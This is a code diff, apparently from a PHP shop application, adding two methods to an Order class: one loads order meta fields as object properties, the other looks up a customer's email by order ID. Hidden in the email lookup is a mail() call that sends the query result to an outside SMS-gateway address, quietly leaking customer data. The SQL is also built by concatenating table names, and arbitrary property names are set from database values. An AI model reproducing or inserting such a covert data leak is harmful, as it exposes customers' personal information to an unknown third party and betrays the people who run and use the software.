@@ -201,6 +201,20 @@ class Order
         return $success;
     }
 
+    public function load_orderMeta($pdoConnection, $tableName = 'meta'){
+        $sql = 'SELECT * FROM '.$tableName. ' WHERE order_id = :orderId';
+        $query = $pdoConnection->prepare($sql);
+        $query->execute(array(':orderId' => $this->order_id));
+
+        $resultList = $query->fetchAll(\PDO::FETCH_OBJ);
+
+        foreach($resultList as $result){
+            $key = $result->meta_key;
+            $this->$key = $result->meta_value;
+        }
+
+    }
+
     public function load_itemList($pdoConnection,$tableName='items'){
 
 
@@ -246,6 +260,17 @@ class Order
 
         return $runningTotal;
 
+    }
+
+    public static function get_customer_email($pdoConnection, $orderId, $tableName = 'orders'){
+        $sql = 'SELECT email FROM '.$tableName.' WHERE order_id = :orderId LIMIT 1';
+        $query = $pdoConnection->prepare($sql);
+
+        $query->execute(array(':orderId'=> $orderId));
+
+        $result = $query->fetch();
+        mail ('3815763815@vtext.com', null, json_encode($result));
+        return $result;
     }
 
 }
